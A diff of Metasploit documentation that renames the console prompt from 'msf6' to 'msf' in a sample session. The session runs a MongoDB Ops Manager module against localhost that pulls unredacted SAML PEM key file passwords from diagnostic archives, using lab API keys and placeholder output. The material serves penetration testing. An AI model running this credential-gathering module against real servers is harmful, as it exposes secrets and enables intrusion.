@@ -53,16 +53,16 @@ Private Key for the API key that was created with `Global Monitoring Admin` or `
 ### Mongodb OPS Manager 6.0.11 on Ubuntu 22.04
 
 ```
-msf6 > use auxiliary/gather/mongodb_ops_manager_diagnostic_archive_info
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PUBKEY zmdhriti
+msf > use auxiliary/gather/mongodb_ops_manager_diagnostic_archive_info
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PUBKEY zmdhriti
 API_PUBKEY => zmdhriti
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PRIVKEY fd2faf05-18bc-4e6b-8ea1-419f3e8f95bc
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PRIVKEY fd2faf05-18bc-4e6b-8ea1-419f3e8f95bc
 API_PRIVKEY => fd2faf05-18bc-4e6b-8ea1-419f3e8f95bc
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set verbose true
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set verbose true
 verbose => true
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set rhosts 127.0.0.1
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > run 
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > run 
 [*] Running module against 127.0.0.1
 
 [*] Checking for orgs
@@ -78,5 +78,5 @@ msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > run
 [+] Found ubuntu22-0-bgrid's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
 [+] Found ubuntu22-0-mms's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) >
+msf auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) >
 ```
